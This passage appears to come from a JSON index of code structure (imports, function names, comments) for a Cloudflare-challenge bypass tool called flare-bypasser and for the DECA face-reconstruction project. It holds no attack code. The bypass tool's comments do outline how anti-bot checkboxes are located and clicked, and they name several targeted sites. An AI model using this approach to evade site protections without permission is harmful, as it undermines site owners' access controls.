          "# [start_port .. end_port]: localy started proxies will use ports in this interval",
          "# wait start if it in progress",
          "# < Start/wait start or simple increase ref.",
          "# Start proxy process",
          "# Close proxy process"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": [
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/examples/custom_user_commands/CustomUserCommands.py",
        "docstrings": [],
        "function_defs": [
          "def get_user_commands():"
        ],
        "class_defs": [
          "class MyClickCommandProcessor(BaseCommandProcessor):"
        ],
        "imports": [
          "import zendriver_flare_bypasser as zendriver",
          "from flare_bypasser import BaseCommandProcessor, Request, Response, BrowserWrapper"
        ],
        "comments": [
          "# Here we can check some required parameters in req.params and raise error.",
          "# Expect here \"Bledny kod\" text in DOM (appears only after click)"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/examples/async_client/async_client_example.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import asyncio",
          "import argparse",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/tests/unit_tests/proxy_controller_test.py",
        "docstrings": [],
        "function_defs": [
          "def test_two_different_proxies_rent():",
          "def test_two_equal_proxies_rent():"
        ],
        "class_defs": [],
        "imports": [
          "from flare_bypasser import ProxyController"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser",
    "name": "flare-bypasser",
    "languages": [
      "Python"
    ],
    "python_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/setup.py",
        "docstrings": [],
        "function_defs": [
          "def is_installed(pkgname):"
        ],
        "class_defs": [],
        "imports": [
          "import sys",
          "import os",
          "import importlib",
          "import distutils.core"
        ],
        "comments": [
          "# Trick for avoid installation of non pip installed packages (apt), available by ADDITIONAL_PYTHONPATH",
          "# 'websockets @ git+https://github.com/yoori/websockets.git@main',",
          "# 'zendriver_flare_bypasser==0.2.7',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@debug4',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@flare-bypasser-test',",
          "# Server dependecies"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/utils/linux_chrome_archive_installer.py",
        "docstrings": [],
        "function_defs": [
          "def fetch_package(download_url):",
          "def unzip_package(",
          "def download_and_install(version_prefix = None, install_root = None, arch = 'x86_64'):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import shutil",
          "import logging",
          "import json",
          "import zipfile",
          "import argparse",
          "from urllib.request import urlretrieve, urlopen"
        ],
        "comments": [
          "# Script can install chrome only on linux platforms and only on x86_64.",
          "# here no archive of versions for linux/arm64",
          "# If version is undefined: use max_version"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 6,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/utils/checkbox_recognizer.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import sys",
          "import logging",
          "import argparse",
          "import cv2",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/src/flare_bypasser/browser_wrapper.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, center):",
          "def __init__(self, page: zendriver.Tab, center_coords):",
          "def _make_attrs(self):  # override for exclude exception on __init__",
          "def __init__(",
          "def __del__(self):",
          "def start_xvfb_display():",
          "def get_driver(self) -> zendriver.Tab:",
          "def _parse_call(task):"
        ],
        "class_defs": [
          "class BrowserWrapper(object):",
          "class FakePosition(object):",
          "class FakeNode(object):",
          "class FakeElement(zendriver.Element):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import typing",
          "import asyncio",
          "import uuid",
          "import shutil",
          "import logging",
          "import time",
          "import cv2",
          "import zendriver_flare_bypasser as zendriver",
          "from xvfbwrapper import Xvfb"
        ],
        "comments": [
          "# < zendriver expect here only json serializable types",
          "# Attributes for working __repr__:",
          "# overrides for call only cdp click send in zendriver.Element.mouse_click",
          "# \"--disable-software-rasterizer\",",
          "# Disable certificates checking",
          "# browser_args += [\"--ignore-certificate-errors\", \"--ignore-urlfetcher-cert-requests\"]",
          "# Get original driver page impl - can be used only in user command specific implementations",
          "# return (title, loaded flag)",
          "# DOM tree changed in runtime",
          "# Ignore \"DOM agent isn't enabled\" on DOM.disable",
          "# < zendriver timeout on element waiting",
          "# external timeout: page isn't loaded",
          "# < Select without waiting.",
          "# DOM tree changed in runtime",
          "# Ignore \"DOM agent isn't enabled\" on DOM.disable",
          "# we work only with one page - close all tabs (excluding first - this close browser)",
          "# Specific workaround for zendriver",
          "# click by coordinates without no driver patching.",
          "# convert {\"name\": \"...\", \"value\": \"...\", ...} to array of http.cookiejar.Cookie",
          "# < self._zendriver_driver.cookies.set_all(set_cookies)",
          "# return list of dict have format: {\"name\": \"...\", \"value\": \"...\"}",
          "# < self._zendriver_driver.cookies.get_all(requests_cookie_format=True)",
          "# convert array of http.cookiejar.Cookie to expected cookie format",
          "# Wrap call that allow to repeat driver call after timeout_step",
          "# Used as workaround for case when chrome don't response on CDP request",
          "# Can be disabled by enable_lost_cdp_workaround flag",
          "# for understand why we pass lambda to _deffered_call, see _deffered_call description",
          "# handle exceptions like: TypeError: target must be set to a 'TargetInfo' but got 'NoneType",
          "# it can appears in zendriver.connection.update_target on all operations,",
          "# (as result of runtime DOM changes or on page loading)",
          "# task is function, that will return coro, this allow to",
          "# avoid \"coroutine ... was never awaited\" warning",
          "# (we create coro only before it await)",
          "# wait first task canceled for get stack in exception"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 25,
        "decorators": [
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/src/flare_bypasser/example_command_processor.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class ExampleCommandProcessor(flare_bypasser.BaseCommandProcessor):"
        ],
        "imports": [
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/src/flare_bypasser/flare_bypasser.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, _dict=None):",
          "def __str__(self):",
          "def __init__(self, _dict):",
          "def __str__(self):",
          "def __init__(self, message: str, step: str = None):",
          "def __init__(",
          "def title_is_denied_title(page_title):",
          "def _get_dominant_color(image):",
          "def _get_flare_rect_contours(image, save_steps_dir: str = None):",
          "def get_flare_click_point(image, logger = None, save_steps_dir: str = None, log_prefix = ''):",
          "def _platform_for_error() -> str:"
        ],
        "class_defs": [
          "class Request(object):",
          "class Response:",
          "class BaseCommandProcessor(object):",
          "class GetCookiesCommandProcessor(BaseCommandProcessor):",
          "class GetPageCommandProcessor(BaseCommandProcessor):",
          "class PostCommandProcessor(BaseCommandProcessor):",
          "class Solver(object):",
          "class Exception(Exception):"
        ],
        "imports": [
          "import abc",
          "import sys",
          "import logging",
          "import os",
          "import typing",
          "import copy",
          "import random",
          "import datetime",
          "import asyncio",
          "import certifi",
          "import contextlib",
          "import html",
          "import urllib",
          "import numpy as np",
          "import cv2",
          "from .browser_wrapper import BrowserWrapper",
          "from .proxy_controller import ProxyController"
        ],
        "comments": [
          "# Image processing imports",
          "# Cloudflare",
          "# Cloudflare",
          "# Custom CloudFlare for EbookParadijs, Film-Paleis, MuziekFabriek and Puur-Hollands",
          "# Fairlane / pararius.com",
          "# preprocess url before solve (for example: can replace url with page content for POST request processing)",
          "# prepare page with form for emulate POST.",
          "# init standard commands",
          "# do some validations",
          "# Read outputs only after driver close (when process stopped),",
          "# otherwise output reading can be blocked.",
          "# Reask title (page loading can be finished between title getting and html checking)",
          "# find access denied titles",
          "# find access denied selectors",
          "# find challenge by title",
          "# find challenge by selectors",
          "# check that challenge present (wait when it will disappear after click)",
          "# check that need to click,",
          "# get screenshot of full page (all elements is in shadowroot)",
          "# clicking can be required few times.",
          "# recheck that challenge present - we can be already redirected and",
          "# need to exclude click on result page",
          "# < preprocess_command can say, that page opening isn't required (it opened it already).",
          "# navigate to the page",
          "# set cookies if required",
          "# find challenge by title",
          "# After solve, don't execute js ! Only extension can (it know page properties),",
          "# some pages can have problems with js evaluation (blocked js loop, ...)",
          "# Ask required page traits in parallel",
          "# We use separate driver instance for fill user-agent !",
          "# For fill user-agent we need to execute js,",
          "# requested page can have bad implementation and can blocks js execution (inf loop, ...)",
          "# Create instance without proxy",
          "# start_cpu_time = time.process_time()",
          "# Step, that can be runned once",
          "# Common steps",
          "# Dilate little omissions in contours (lost by color range or by image quality).",
          "# Dilate for increase contours detection precision.",
          "# end_cpu_time = time.process_time()",
          "# end_cpu_time = time.process_time()",
          "# ignore small rectangles",
          "# ignore very big rectangles",
          "# calculate area difference",
          "# eval iou with (with undestanding that contour_area inside rect_area)",
          "# get minimal contour (usualy we have here 3 contours",
          "# pack low distance contours (one rect can be present as 2 contours: inner, outer)",
          "# remove buggest contour",
          "# rect contours sorted by area ascending",
          "# Now we should find two rect contours (one inside other) with ratio 1-5%, (now I see: 0.0213).",
          "# Check area ratio and that area1 inside area2.",
          "# Checkbox found.",
          "# fix ssl certificates for compiled binaries",
          "# https://github.com/pyinstaller/pyinstaller/issues/7229",
          "# https://stackoverflow.com/questions/55736855/how-to-change-the-cafile-argument-in-the-ssl-module-in-python3"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 30,
        "decorators": [
          "@abc.abstractmethod",
          "@abc.abstractmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/src/flare_bypasser/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import importlib.metadata",
          "from .flare_bypasser import Request, Response, Solver, BrowserWrapper, BaseCommandProcessor",
          "from .proxy_controller import ProxyController",
          "from .flare_bypass_server import server, server_run",
          "from .async_client import AsyncClient"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/src/flare_bypasser/async_client.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, solver_url, *args, **kwargs):",
          "def http_client(self) -> httpx.AsyncClient:",
          "def _init_client(self):"
        ],
        "class_defs": [
          "class AsyncClient(object):",
          "class Exception(Exception):",
          "class CloudFlareBlocked(Exception):"
        ],
        "imports": [
          "import typing",
          "import copy",
          "import json",
          "import re",
          "import httpx"
        ],
        "comments": [
          "# < base user-agent that will be used before first challenge solve,",
          "# after it will be replaced with solver actual user-agent",
          "# request web page",
          "# check that it is cloud flare unsolvable block",
          "# check that it is cloud flare block",
          "# c is http.cookiejar.Cookie",
          "# < use for solve original client cookies,",
          "# it can contains some required information other that cloud flare marker.",
          "# Update _http_client cookies"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": [
          "@property"
        ]
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/src/flare_bypasser/flare_bypass_server.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, app):",
          "def parse_class_command_processors(custom_command_processors_str: str):",
          "def parse_entrypoint_command_processors(extension: str):",
          "def parse_solve_forks(solve_forks: str):",
          "def init_args_parser():",
          "def init_extensions(args):",
          "def server_run():"
        ],
        "class_defs": [
          "class RemoveContentTypeRequirementMiddleware(object):",
          "class ProxyModel(pydantic.BaseModel):",
          "class CookieModel(pydantic.BaseModel):",
          "class DefferedForksModel(pydantic.BaseModel):",
          "class HandleCommandResponseSolution(pydantic.BaseModel):",
          "class HandleCommandResponse(pydantic.BaseModel):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import re",
          "import typing",
          "import typing_extensions",
          "import datetime",
          "import copy",
          "import platform",
          "import uuid",
          "import pathlib",
          "import asyncio",
          "import traceback",
          "import importlib",
          "import logging",
          "import argparse",
          "import urllib3.util",
          "import fastapi",
          "import pydantic",
          "import flare_bypasser",
          "import gunicorn.app.wsgiapp",
          "import uvicorn.main"
        ],
        "comments": [
          "# Remove requirement for Content-Type header presence.",
          "# Unexpected headers format - don't make something.",
          "# Adapt proxy format for canonical representation.",
          "# < solve_response can't be None if no return_condition passed to wait_first_non_exception,",
          "# only exception expected",
          "# < pass cookies as dict's (solver don't know about rest model).",
          "# Endpoint compatible with flaresolverr API.",
          "# REST API concept methods.",
          "# postDataContentType: typing_extensions.Annotated[",
          "#   str,",
          "#   fastapi.Body(description=\"Content-Type that will be sent.\")",
          "#   ]='',",
          "# 'postDataContentType': postDataContentType,",
          "# < parse for pass to gunicorn as is and as \"--host X --port X\" to uvicorn",
          "# FLARE_BYPASS_COMMANDPROCESSORS format: <command>:<module>.<class>",
          "# class should have default constructor (without parameters)",
          "# Expect that extension element has format: <module>.<method>",
          "# Init ProxyController"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 2,
        "error_handling": 22,
        "decorators": [
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post("
        ]
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/src/flare_bypasser/proxy_controller.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, proxy_storage: object, local_port: int, url: str):",
          "def add_ref(self):",
          "def remove_ref(self):",
          "def __init__(self, proxy_holder: object):",
          "def local_port(self):",
          "def url(self):",
          "def is_alive(self):",
          "def release(self):",
          "def __enter__(self):",
          "def __exit__(self, type, value, traceback):",
          "def __del__(self):",
          "def __init__(",
          "def get_proxy(self, url):",
          "def opened_proxies_count(self):",
          "def _port_is_listen(port):",
          "def _choose_port(self, url):",
          "def _start_proxy(self, proxy_holder):",
          "def _close_proxy(self, proxy_holder):"
        ],
        "class_defs": [
          "class ProxyController(object):",
          "class PortBusy(Exception):",
          "class NoPortForListen(Exception):",
          "class RunProxyCommandError(Exception):",
          "class ProxyHolder(object):",
          "class ProxyHolderRef(object):"
        ],
        "imports": [
          "import typing",
          "import threading",
          "import subprocess",
          "import socket",
          "import logging",
          "import contextlib",
          "import oslex",
          "import jinja2"
        ],
        "comments": [
          "# [start_port .. end_port]: localy started proxies will use ports in this interval",
          "# wait start if it in progress",
          "# < Start/wait start or simple increase ref.",
          "# Start proxy process",
          "# Close proxy process"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 7,
        "decorators": [
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/examples/custom_user_commands/CustomUserCommands.py",
        "docstrings": [],
        "function_defs": [
          "def get_user_commands():"
        ],
        "class_defs": [
          "class MyClickCommandProcessor(BaseCommandProcessor):"
        ],
        "imports": [
          "import zendriver_flare_bypasser as zendriver",
          "from flare_bypasser import BaseCommandProcessor, Request, Response, BrowserWrapper"
        ],
        "comments": [
          "# Here we can check some required parameters in req.params and raise error.",
          "# Expect here \"Bledny kod\" text in DOM (appears only after click)"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/examples/async_client/async_client_example.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import asyncio",
          "import argparse",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/utils/drission_page_solver/drission_page_solver.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, driver: ChromiumPage, max_retries=-1, log=True):",
          "def search_recursively_shadow_root_with_iframe(self, ele):",
          "def search_recursively_shadow_root_with_cf_input(self, ele):",
          "def locate_cf_button(self):",
          "def log_message(self, message):",
          "def click_verification_button(self):",
          "def is_bypassed(self):",
          "def bypass(self):",
          "def bypass_cloudflare(url: str, retries: int, log: bool, proxy: str = None) -> ChromiumPage:",
          "def main():"
        ],
        "class_defs": [
          "class CloudflareBypasser:"
        ],
        "imports": [
          "import sys",
          "import logging",
          "import time",
          "import numpy as np",
          "import argparse",
          "import cv2",
          "from pyvirtualdisplay import Display",
          "from DrissionPage import ChromiumPage, ChromiumOptions, WebPage"
        ],
        "comments": [
          "# If the button is not found, search it recursively",
          "# Start Xvfb for Docker"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 7,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser/tests/unit_tests/proxy_controller_test.py",
        "docstrings": [],
        "function_defs": [
          "def test_two_different_proxies_rent():",
          "def test_two_equal_proxies_rent():"
        ],
        "class_defs": [],
        "imports": [
          "from flare_bypasser import ProxyController"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Users/davidquinton/Projects/character-pipeline/DECA",
    "name": "DECA",
    "languages": [
      "Python",
      "C++"
    ],
    "python_patterns": [
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/main_train.py",
        "docstrings": [],
        "function_defs": [
          "def main(cfg):"
        ],
        "class_defs": [],
        "imports": [
          "import os, sys",
          "import numpy as np",
          "import yaml",
          "import torch",
          "import torch.backends.cudnn as cudnn",
          "import torch",
          "import shutil",
          "from copy import deepcopy",
          "from decalib.deca import DECA",
          "from decalib.trainer import Trainer",
          "from decalib.utils.config import parse_args"
        ],
        "comments": [
          "# creat folders",
          "# cudnn related setting",
          "# start training",
          "# deca model",
          "## start train",
          "# run:",
          "# python main_train.py --cfg configs/release_version/deca_pretrain.yml"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/deca.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, config=None, device='cuda'):",
          "def _setup_renderer(self, model_cfg):",
          "def _create_model(self, model_cfg):",
          "def decompose_code(self, code, num_dict):",
          "def displacement2normal(self, uv_z, coarse_verts, coarse_normals):",
          "def visofp(self, normals):",
          "def encode(self, images, use_detail=True):",
          "def decode(self, codedict, rendering=True, iddict=None, vis_lmk=True, return_vis=True, use_detail=True,",
          "def visualize(self, visdict, size=224, dim=2):",
          "def save_obj(self, filename, opdict):",
          "def run(self, imagepath, iscrop=True):",
          "def model_dict(self):"
        ],
        "class_defs": [
          "class DECA(nn.Module):"
        ],
        "imports": [
          "import os, sys",
          "import torch",
          "import torchvision",
          "import torch.nn.functional as F",
          "import torch.nn as nn",
          "import numpy as np",
          "from time import time",
          "from skimage.io import imread",
          "import cv2",
          "import pickle",
          "from .utils.renderer import SRenderY, set_rasterizer",
          "from .models.encoders import ResnetEncoder",
          "from .models.FLAME import FLAME, FLAMETex",
          "from .models.decoders import Generator",
          "from .utils import util",
          "from .utils.rotation_converter import batch_euler2axis",
          "from .utils.tensor_cropper import transform_points",
          "from .datasets import datasets",
          "from .utils.config import cfg"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "#",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# Using this computer program means that you agree to the terms",
          "# in the LICENSE file included with this software distribution.",
          "# Any use not explicitly granted by the LICENSE is prohibited.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For comments or questions, please email us at deca@tue.mpg.de",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de",
          "# face mask for rendering details",
          "# displacement correction",
          "# mean texture",
          "# dense mesh template, for save detail mesh",
          "# set up parameters",
          "# encoders",
          "# decoders",
          "# resume model",
          "# exit()",
          "# eval mode",
          "# @torch.no_grad()",
          "# use_detail is for training detail model, need to set coarse model as eval mode",
          "# @torch.no_grad()",
          "## decode",
          "## projection",
          "## rendering",
          "# import ipdb; ipdb.set_trace()",
          "# ops = self.render(verts, trans_verts, albedo, codedict['light'])",
          "## output",
          "## render shape",
          "## extract texture",
          "## TODO: current resolution 256x256, support higher resolution, and add visibility",
          "## TODO: poisson blending should give better-looking results",
          "# save coarse mesh, with texture and normal map",
          "# upsample mesh, save detailed mesh"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/trainer.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, model, config=None, device='cuda:0'):",
          "def configure_optimizers(self):",
          "def load_checkpoint(self):",
          "def training_step(self, batch, batch_nb, training_type='coarse'):",
          "def validation_step(self):",
          "def evaluate(self):",
          "def prepare_data(self):",
          "def fit(self):"
        ],
        "class_defs": [
          "class Trainer(object):"
        ],
        "imports": [
          "import os, sys",
          "import torch",
          "import torchvision",
          "import torch.nn.functional as F",
          "import torch.nn as nn",
          "from torch.utils.data import DataLoader",
          "import numpy as np",
          "from time import time",
          "from skimage.io import imread",
          "import cv2",
          "import pickle",
          "from loguru import logger",
          "from datetime import datetime",
          "from tqdm import tqdm",
          "from .utils.renderer import SRenderY",
          "from .models.encoders import ResnetEncoder",
          "from .models.FLAME import FLAME, FLAMETex",
          "from .models.decoders import Generator",
          "from .utils import util",
          "from .utils.rotation_converter import batch_euler2axis",
          "from .datasets import datasets",
          "from .utils.config import cfg",
          "from .utils import lossfunc",
          "from .datasets import build_datasets",
          "from torch.utils.tensorboard import SummaryWriter",
          "from .datasets.now import NoWDataset"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "#",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# Using this computer program means that you agree to the terms",
          "# in the LICENSE file included with this software distribution.",
          "# Any use not explicitly granted by the LICENSE is prohibited.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For comments or questions, please email us at deca@tue.mpg.de",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de",
          "# training stage: coarse and detail",
          "# deca model",
          "# initialize loss",
          "# # initialize loss",
          "# resume training, including model weight, opt, steps",
          "# import ipdb; ipdb.set_trace()",
          "# load model weights only",
          "# [B, K, 3, size, size] ==> [BxK, 3, size, size]",
          "#-- encoder",
          "### shape constraints for coarse model",
          "### detail consistency for detail model",
          "# import ipdb; ipdb.set_trace()",
          "## append gt",
          "###--------------- training coarse model",
          "#-- decoder",
          "#------ rendering",
          "# mask",
          "# images",
          "#### ----------------------- Losses",
          "############################# base shape",
          "# import ipdb; ipdb.set_trace()",
          "# reg on jaw pose",
          "###--------------- training detail model",
          "#-- decoder",
          "# FLAME - world space",
          "# world to camera",
          "# camera to image space",
          "#------ rendering",
          "# mask",
          "# images",
          "# render detail",
          "#--- extract texture",
          "# self-occlusion",
          "## combine masks",
          "#### ----------------------- Losses",
          "############################### details",
          "# if self.cfg.loss.old_mrf:",
          "#     if self.cfg.loss.old_mrf_face_mask:",
          "#         masks = masks*mask_face_eye*ops['alpha_images']",
          "#     losses['photo_detail'] = (masks*(predicted_detailed_image - images).abs()).mean()*100",
          "#     losses['photo_detail_mrf'] = self.mrf_loss(masks*predicted_detailed_image, masks*images)*0.1",
          "# else:",
          "#########################################################",
          "# run now validation images",
          "#-- save results for evaluation",
          "# save mesh",
          "# save 7 landmarks for alignment",
          "# import ipdb; ipdb.set_trace()",
          "# print(os.path.join(savefolder, imagename[k], name + '_' + vis_name +'.jpg'))",
          "# visualize results to check",
          "## then please run main.py in https://github.com/soubhiksanyal/now_evaluation, it will take around 30min to get the metric results",
          "# for step, batch in enumerate(tqdm(self.train_dataloader, desc=f\"Epoch: {epoch}/{self.cfg.train.max_epochs}\")):",
          "# import ipdb; ipdb.set_trace()",
          "#"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/demos/demo_teaser.py",
        "docstrings": [],
        "function_defs": [
          "def main(args):"
        ],
        "class_defs": [],
        "imports": [
          "import os, sys",
          "import cv2",
          "import numpy as np",
          "from time import time",
          "from scipy.io import savemat",
          "import argparse",
          "import imageio",
          "from skimage.transform import rescale",
          "import torch",
          "from decalib.deca import DECA",
          "from decalib.datasets import datasets",
          "from decalib.utils import util",
          "from decalib.utils.rotation_converter import batch_euler2axis, deg2rad",
          "from decalib.utils.config import cfg as deca_cfg"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "#",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# Using this computer program means that you agree to the terms",
          "# in the LICENSE file included with this software distribution.",
          "# Any use not explicitly granted by the LICENSE is prohibited.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For comments or questions, please email us at deca@tue.mpg.de",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de",
          "# load test images",
          "# DECA",
          "### show shape with different views and expressions",
          "## yaw angle",
          "# expression: jaw pose",
          "# expression: jaw pose",
          "# transfer exp code",
          "### write gif",
          "# rendering option",
          "# process test images"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/demos/demo_reconstruct.py",
        "docstrings": [],
        "function_defs": [
          "def main(args):"
        ],
        "class_defs": [],
        "imports": [
          "import os, sys",
          "import cv2",
          "import numpy as np",
          "from time import time",
          "from scipy.io import savemat",
          "import argparse",
          "from tqdm import tqdm",
          "import torch",
          "from decalib.deca import DECA",
          "from decalib.datasets import datasets",
          "from decalib.utils import util",
          "from decalib.utils.config import cfg as deca_cfg",
          "from decalib.utils.tensor_cropper import transform_points"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "#",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# Using this computer program means that you agree to the terms",
          "# in the LICENSE file included with this software distribution.",
          "# Any use not explicitly granted by the LICENSE is prohibited.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For comments or questions, please email us at deca@tue.mpg.de",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de",
          "# if args.rasterizer_type != 'standard':",
          "#     args.render_orig = False",
          "# load test images",
          "# run DECA",
          "# for i in range(len(testdata)):",
          "# -- save results",
          "# process test images",
          "# rendering option",
          "# save"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/demos/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/demos/demo_transfer.py",
        "docstrings": [],
        "function_defs": [
          "def main(args):"
        ],
        "class_defs": [],
        "imports": [
          "import os, sys",
          "import cv2",
          "import numpy as np",
          "from time import time",
          "import argparse",
          "import torch",
          "from decalib.deca import DECA",
